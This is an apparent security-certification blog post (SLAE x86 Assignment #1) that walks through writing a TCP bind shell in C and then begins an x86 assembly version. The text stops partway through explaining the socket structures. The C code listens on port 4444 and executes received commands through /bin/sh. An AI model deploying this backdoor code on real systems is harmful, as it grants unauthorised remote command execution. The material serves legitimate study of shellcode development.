<!DOCTYPE html>
<html>
  <!-- Inspired by https://secret.club/ and https://github.com/clayh53/tufte-jekyll -->

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>SLAE x86 Exam - Assignment #1</title>
    <meta name="description" content="DisclaimerThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:https://www.pentesteracadem...">

    <link rel="stylesheet" type="text/css" href="/assets/css/fonts.min.css">
    <link rel="canonical" href="/21/11/28/slae32-assignment-1">
    <link rel="alternate" type="application/rss+xml" title="rbct" href="/feed.xml" />

    <style>
         * { margin: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 1rem; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 1rem; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "JetBrains Mono",monospace; text-rendering: geometricPrecision; -moz-osx-font-smoothing: grayscale; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono { font-family: 'JetBrains Mono', monospace; font-weight: 500; } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: 1rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #1d2021; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { font-size: 1rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 1rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.725; margin-bottom: 1rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 1.5rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; margin-right: 10px } h3:before { content: "##"; } h1 { font-size: 1.3em; } h3 { font-size: 1.3em; } p a, main li a { text-decoration: underline; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "â€¢"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em 0 0; padding-left: 20px; border-left: 4px solid #444 } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { padding-left: 5px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { color: #fe8019; background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } p > code { font-size: 0.925rem; } @media screen and (min-width: 640px) { pre > code { font-size: 1rem; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } p:has(aside) { border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1) }} @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer.tags { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); } div.epigraph footer { text-align: right; margin-bottom: 2rem;} section.pagination { padding-bottom: 1rem; } img + em { display: block; text-align: center; } table { border: 1px solid; padding: 10px; margin-bottom: 10px } td { padding: 2px 10px; } div.highlighter-rouge, code.language-text { background-color: var(--bg-1); padding: 15px 10px 10px 10px; margin-bottom: 10px } sub { font-size: 0.875rem }
    </style>
</head>

  <body>
    <!--- Header and nav template site-wide -->
<header>
    <a href="/">RBCT</a>

    <nav class="group">
        

            
            

        

            
            

                
                <a href="/">POSTS</a>
                

            

        

            
            

                
                <a href="/about/">ABOUT</a>
                

            

        

            
            

        
    </nav>
</header>
    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting">
        <h1>SLAE x86 Exam - Assignment #1</h1>

        <div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px">
            <img itemprop="image" alt="rbct" src="/assets/author_profile_img/rbct.png">
            <span class="mono authors">
                <a href="" itemprop="name">rbct</a>
            </span>
        </div>

        <time class="mono" datetime="2021-11-28T00:00:00+01:00" itemProp="datePublished">
            28 November 2021
        </time>

        <hr>
        <main itemprop="articleBody" style="position: relative;">
            <h2 id="disclaimer">Disclaimer</h2>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:</p>
<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
<p>Student ID: PA-30398</p>
<h2 id="foreword">Foreword</h2>
<p>The 1st assignment requires you to write a <code>Bind Shell TCP</code>, which is simply a listening socket that executes the commands received from the client socket, redirecting input, output, and error, to the latter.</p>
<p>A requirement of this assignment is for the <strong>TCP port number</strong> to be <strong>easily configurable</strong>.</p>
<h2 id="source-code">Source code</h2>
<p>The full source code is stored inside the repository created for this Exam: <a href="https://github.com/rbctee/SlaeExam/tree/main/slae32/assignment/1/attempt">rbctee/SlaeExam</a>.</p>
<p>List of files:</p>
<ul>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/first/shell_bind_tcp.c">attempt/first/shell_bind_tcp.c</a>: first attempt at writing a Bind Shell in <code>C</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/first/shell_bind_tcp.nasm">attempt/first/shell_bind_tcp.nasm</a>: first attempt at writing a Bind Shell in <code>Assembly</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/shell_bind_tcp.c">attempt/final/shell_bind_tcp.c</a>: final attempt at writing a Bind Shell in <code>C</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/shell_bind_tcp.nasm">attempt/final/shell_bind_tcp.nasm</a>: final attempt at writing a Bind Shell in <code>Assembly</code></li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/automation/wrapper.py">attempt/final/automation/wrapper.py</a>: <code>python</code> script to automate the generation of shellcode based on arbitrary TCP ports</li>
<li><a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/final/automation/template.nasm">attempt/final/automation/template.nasm</a>: generic template used by <code>wrapper.py</code></li>
</ul>
<h2 id="first-attempt">First Attempt</h2>
<p>Follows the visual representation of the first implementation:</p>
<p><img src="/assets/img/slae32/bind_shellcode_tcp_1.jpg" alt="First Implementation of Bind Shell TCP" />
<em>My first implementation of a TCP Bind Shell</em></p>
<h3 id="c-code">C Code</h3>
<p>Based on the graph previously shown, the first step is to create TCP socket that listens on a specific combination of IP address and TCP port. For now I chose to use <code>0.0.0.0:4444</code>; in the chapter <strong>Automation</strong> I explain how to use a <code>python</code> script to specify arbitary values (for the TCP port).</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">server_socket_fd</span><span class="p">;</span>
<span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">server_address</span><span class="p">;</span>

<span class="c1">// create a TCP socket</span>
<span class="n">server_socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>
</code></pre></div></div>
<p><sub class='aside'>The <code>socket()</code> function creates a socket, which is represented by a <code>File Descriptor</code> (abbreviated as <code>fd</code>) on Linux systems
</sub></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">server_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
<span class="n">server_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
<span class="n">server_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>

<span class="c1">// bind the socket to 0.0.0.0:4444</span>
<span class="n">bind</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server_address</span><span class="p">));</span>

<span class="c1">// set it as a passive socket that listens for connections</span>
<span class="n">listen</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>
<p>Let's look at the code above: initially, a socket is created through the <code>socket</code> function, which returns a <code>File Descriptor</code>. The arguments <code>SOCK_STREAM</code> and <code>IPPROTO_TCP</code> allow for the creation of a <code>TCP</code> socket.</p>
<p>After that, you have to to specify the address and port number on which to bind the socket. In this case, I used <code>INADDR_ANY</code> (i.e. <code>0.0.0.0</code>) and the typical TCP port used by <em>Metasploit</em> (<code>4444</code>).</p>
<p>These variables are passed to the <code>bind</code> function, which performs the binding operation. However, if you were to run <code>ss -tnl</code> (or <code>netstat -plnt</code>), you wouldn't find the current socket yet.</p>
<p>The reason is that we have to execute the <code>listen</code> function first. Let's look at its <a href="https://man7.org/linux/man-pages/man2/listen.2.html">prototype</a>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;sys/socket.h&gt;
</span>
<span class="kt">int</span> <span class="nf">listen</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="kt">int</span> <span class="n">backlog</span><span class="p">);</span>
</code></pre></div></div>
<p>It accepts 2 arguments:</p>
<ol>
<li>the file descriptor of a TCP socket</li>
<li><em>the maximum length to which the queue of pending connections for sockfd may grow</em> (ref: <a href="https://man7.org/linux/man-pages/man2/listen.2.html">man page</a>)</li>
</ol>
<p>Before being able to receive data and execute commands, the socket has to accept a connection from incoming clients:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">client_socket_fd</span><span class="p">,</span> <span class="n">bytes_read</span><span class="p">,</span> <span class="n">size_client_socket_struct</span><span class="p">;</span>
<span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">client_address</span><span class="p">;</span>

<span class="c1">// accept incoming connections</span>
<span class="n">size_client_socket_struct</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr_in</span><span class="p">);</span>
<span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_client_socket_struct</span><span class="p">);</span>
</code></pre></div></div>
<p><sub class='aside'>Accept a client connection and place its socket inside the variable <code>client_address</code>
</sub></p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// redirect standard input/output/error to the socket</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</code></pre></div></div>
<p>I used <code>dup2</code> in order to redirect <code>stdin</code>, <code>stdout</code>, and <code>stderr</code> of the current shell towards the client socket, so it acts as an interactive shell.</p>
<p>What's missing now is the code that executes the commands sent by the client:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">char</span> <span class="n">client_command</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>

<span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">parmList</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"-c"</span><span class="p">,</span> <span class="n">client_command</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
<span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envParms</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="nb">NULL</span><span class="p">};</span>

<span class="c1">// receive data from client (max 1024 bytes)</span>
<span class="k">while</span> <span class="p">((</span><span class="n">bytes_read</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">client_command</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// execute client command</span>
    <span class="n">system</span><span class="p">(</span><span class="n">client_command</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">client_command</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_command</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>
<p>The loop right above checks if the client has sent any data. If so, it executes the command and sends <code>input</code>/<code>output</code>/<code>error</code> to the client socket.</p>
<p>Finally, it uses the function <code>memset</code> to clear the buffer that stores the command, in order to avoid previous commands from corrupting next ones.</p>
<p>The full C program can be found inside the <a href="https://github.com/rbctee/SlaeExam/blob/main/slae32/assignment/1/attempt/first/shell_bind_tcp.c">repo created for this exam</a>.</p>
<h3 id="assembly">Assembly</h3>
<h4 id="socket-creation">Socket creation</h4>
<p>The first function we need to convert into Assembly is <code>socket</code>. Unfortunately, there isn't a specific syscall that creates a socket, although there is one named <code>socketcall</code>. Follows an excerpt taken from its <a href="https://linux.die.net/man/2/socketcall">man page</a>:</p>
<blockquote>
<p><code>int socketcall(int call, unsigned long *args);</code></p>
<p><strong>socketcall()</strong> is a common kernel entry point for the socket system calls. <em>call</em> determines which socket function to invoke. <em>args</em> points to a block containing the actual arguments, which are passed through to the appropriate call.</p>
</blockquote>
<p>Based on this description and the function prototype, it seems we first need to find the right <code>call</code> value that references <code>socket()</code>. Although man pages don't list all the possible values for this argument (please contact me if you find them inside the man pages), we can take a look at the source code of the Linux kernel.</p>
<p>To be more specific, <a href="https://github.com/torvalds/linux/blob/master/net/socket.c#L2901">this page</a> contains the implementation of the <code>socketcall</code> function, listing several possible value for the argument <code>call</code>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ...</span>

<span class="k">switch</span> <span class="p">(</span><span class="n">call</span><span class="p">)</span> <span class="p">{</span>

  <span class="k">case</span> <span class="n">SYS_SOCKET</span><span class="p">:</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">__sys_socket</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="k">case</span> <span class="n">SYS_BIND</span><span class="p">:</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">__sys_bind</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="k">case</span> <span class="n">SYS_CONNECT</span><span class="p">:</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">__sys_connect</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="k">case</span> <span class="n">SYS_LISTEN</span><span class="p">:</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">__sys_listen</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="n">a1</span><span class="p">);</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="k">case</span> <span class="n">SYS_ACCEPT</span><span class="p">:</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">__sys_accept4</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">break</span><span class="p">;</span>

  <span class="k">case</span> <span class="n">SYS_GETSOCKNAME</span><span class="p">:</span>
    <span class="n">err</span> <span class="o">=</span> <span class="n">__sys_getsockname</span><span class="p">(</span><span class="n">a0</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">a1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span> <span class="n">__user</span> <span class="o">*</span><span class="p">)</span><span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="k">break</span><span class="p">;</span>

<span class="c1">// ...</span>
</code></pre></div></div>
<p>Nevertheless, it isn't quite what we want: it doesn't show the integer values for these values. Digging a bit deeper, I found them inside the file <a href="https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27">include/uapi/linux/net.h</a> of the Linux kernel.</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define SYS_SOCKET            1      </span><span class="cm">/*     sys_socket(2)          */</span><span class="cp">
#define SYS_BIND              2      </span><span class="cm">/*     sys_bind(2)            */</span><span class="cp">
#define SYS_CONNECT           3      </span><span class="cm">/*     sys_connect(2)         */</span><span class="cp">
#define SYS_LISTEN            4      </span><span class="cm">/*     sys_listen(2)          */</span><span class="cp">
#define SYS_ACCEPT            5      </span><span class="cm">/*     sys_accept(2)          */</span><span class="cp">
#define SYS_GETSOCKNAME       6      </span><span class="cm">/*     sys_getsockname(2)     */</span><span class="cp">
#define SYS_GETPEERNAME       7      </span><span class="cm">/*     sys_getpeername(2)     */</span><span class="cp">
#define SYS_SOCKETPAIR        8      </span><span class="cm">/*     sys_socketpair(2)      */</span><span class="cp">
#define SYS_SEND              9      </span><span class="cm">/*     sys_send(2)            */</span><span class="cp">
#define SYS_RECV              10     </span><span class="cm">/*     sys_recv(2)            */</span><span class="cp">
#define SYS_SENDTO            11     </span><span class="cm">/*     sys_sendto(2)          */</span><span class="cp">
#define SYS_RECVFROM          12     </span><span class="cm">/*     sys_recvfrom(2)        */</span><span class="cp">
#define SYS_SHUTDOWN          13     </span><span class="cm">/*     sys_shutdown(2)        */</span><span class="cp">
#define SYS_SETSOCKOPT        14     </span><span class="cm">/*     sys_setsockopt(2)      */</span><span class="cp">
#define SYS_GETSOCKOPT        15     </span><span class="cm">/*     sys_getsockopt(2)      */</span><span class="cp">
#define SYS_SENDMSG           16     </span><span class="cm">/*     sys_sendmsg(2)         */</span><span class="cp">
#define SYS_RECVMSG           17     </span><span class="cm">/*     sys_recvmsg(2)         */</span><span class="cp">
#define SYS_ACCEPT4           18     </span><span class="cm">/*     sys_accept4(2)         */</span><span class="cp">
#define SYS_RECVMMSG          19     </span><span class="cm">/*     sys_recvmmsg(2)        */</span><span class="cp">
#define SYS_SENDMMSG          20     </span><span class="cm">/*     sys_sendmmsg(2)        */</span><span class="cp">
</span></code></pre></div></div>
<p>Now we should be able to use the <code>socket</code> function to create a TCP socket.</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; Author: Robert Catalin Raducioiu (rbct)</span>

<span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>

<span class="nl">_start:</span>

    <span class="c1">; SYSCALLS for 32-bit x86 Linux systems:</span>
    <span class="c1">; /usr/include/i386-linux-gnu/asm/unistd_32.h</span>
    <span class="c1">; or https://web.archive.org/web/20160214193152/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html</span>

    <span class="c1">; sys_socketcall</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; SYS_SOCKET</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>

    <span class="c1">; IPPROTO_TCP</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">6</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; SOCK_STREAM (0x00000001)</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; AF_INET</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mi">2</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; Pointer to the arguments for SYS_SOCKET call</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; call syscall</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>Debugging the program with <code>gdb</code> and stopping after the syscall I noticed the following output:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsof <span class="nt">-p</span> PID

<span class="c"># COMMAND    PID USER   FD   TYPE     DEVICE SIZE/OFF  NODE NAME</span>
<span class="c"># tcp_bind_ 4339 rbct  cwd    DIR        8,1     4096  6052 /home/rbct/exam/assignment_1</span>
<span class="c"># tcp_bind_ 4339 rbct  rtd    DIR        8,1     4096     2 /</span>
<span class="c"># tcp_bind_ 4339 rbct  txt    REG        8,1      522  6053 /home/rbct/exam/assignment_1/tcp_bind_shell</span>
<span class="c"># tcp_bind_ 4339 rbct    0u   CHR      136,0      0t0     3 /dev/pts/0</span>
<span class="c"># tcp_bind_ 4339 rbct    1u   CHR      136,0      0t0     3 /dev/pts/0</span>
<span class="c"># tcp_bind_ 4339 rbct    2u   CHR      136,0      0t0     3 /dev/pts/0</span>
<span class="c"># tcp_bind_ 4339 rbct    3u  unix 0x00000000      0t0 89245 socket</span>
<span class="c"># tcp_bind_ 4339 rbct    4u  unix 0x00000000      0t0 89246 socket</span>
<span class="c"># tcp_bind_ 4339 rbct    5r  FIFO        0,8      0t0 89247 pipe</span>
<span class="c"># tcp_bind_ 4339 rbct    6w  FIFO        0,8      0t0 89247 pipe</span>
<span class="c"># tcp_bind_ 4339 rbct    7u  sock        0,7      0t0 89254 can't identify protocol</span>
</code></pre></div></div>
<p>It successfully created a socket (identified by the file descriptor <code>7</code>, <code>u</code> specifies <code>read</code> and <code>write</code> permissions according to the man page of <code>lsof</code>).</p>
<h4 id="socket-binding">Socket binding</h4>
<p>Next is the turn of the <code>bind</code> function.</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">server_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
<span class="n">server_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
<span class="n">server_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>

<span class="c1">// bind the socket to 0.0.0.0:4444</span>
<span class="n">bind</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server_address</span><span class="p">));</span>
</code></pre></div></div>
<p>First, I need to understand how to create a <code>sockaddr_in</code> struct (variable <code>server_address</code>).</p>
<p>Based on <a href="https://man7.org/linux/man-pages/man7/ip.7.html">the Linux manual</a>, the definition of the struct looks like this:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="p">{</span>
  <span class="n">sa_family_t</span>    <span class="n">sin_family</span><span class="p">;</span> <span class="cm">/* address family: AF_INET */</span>
  <span class="n">in_port_t</span>      <span class="n">sin_port</span><span class="p">;</span>   <span class="cm">/* port in network byte order */</span>
  <span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">sin_addr</span><span class="p">;</span>   <span class="cm">/* internet address */</span>
<span class="p">};</span>

<span class="cm">/* Internet address */</span>
<span class="k">struct</span> <span class="nc">in_addr</span> <span class="p">{</span>
  <span class="kt">uint32_t</span>       <span class="n">s_addr</span><span class="p">;</span>     <span class="cm">/* address in network byte order */</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Now we need the type definition of <code>sa_family_t</code>, which I found defined inside the file <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/socket.h#L26">/usr/include/socket.h</a>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="n">__kernel_sa_family_t</span>    <span class="n">sa_family_t</span><span class="p">;</span>
</code></pre></div></div>
<p>According to the file <a href="https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/socket.h#L10">include/uapi/linux/socket.h</a>, it's an <code>unsigned short</code> integer:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">__kernel_sa_family_t</span><span class="p">;</span>
</code></pre></div></div>
<p>On 32-bit x86 systems, an unsigned short integer requires <code>2 bytes</code> of data. Now there's only <code>in_port_t</code> left. The latter is defined inside the file <a href="https://man7.org/linux/man-pages/man0/netinet_in.h.0p.html">netinetin.h</a>:</p>
<blockquote>
